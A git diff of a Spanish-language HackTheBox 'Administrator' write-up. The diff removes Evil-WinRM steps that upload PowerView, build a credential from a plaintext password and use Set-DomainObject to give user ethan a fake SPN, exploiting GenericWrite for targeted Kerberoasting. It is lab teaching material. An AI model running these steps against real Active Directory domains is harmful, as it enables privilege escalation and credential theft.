@@ -427,31 +427,3 @@ Info: Establishing connection to remote endpoint
 En BloodHound observo que Emily tiene el permiso GenericWrite sobre Ethan, este permiso puede ser explotado para actualizar atributos como permisos de cuenta, o incluso ejecutar la escalada de privilegios modificando scripts de inicio de sesión o directores de servicio.
 
 ![imagen](https://github.com/user-attachments/assets/850405bf-dddb-4e96-9a09-0055958aec32)
-
-Descargo e importo PowerView.ps1
-
-```bash
-*Evil-WinRM* PS C:\Users\emily\Documents> upload /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1
-                                        
-Info: Uploading /home/juanca/Desktop/juanca/HTB/Administrator/content/PowerView.ps1 to C:\Users\emily\Documents\PowerView.ps1
-                                        
-Data: 1027036 bytes of 1027036 bytes copied
-                                        
-Info: Upload successful!
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\emily\Documents> Import-Module .\PowerView.ps1
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\emily\Documents> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-```
-
-```bash
-*Evil-WinRM* PS C:\Users\emily\Documents> Set-DomainObject -Credential $Cred -Identity ethan -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
-```
-
-```bash
-
-```
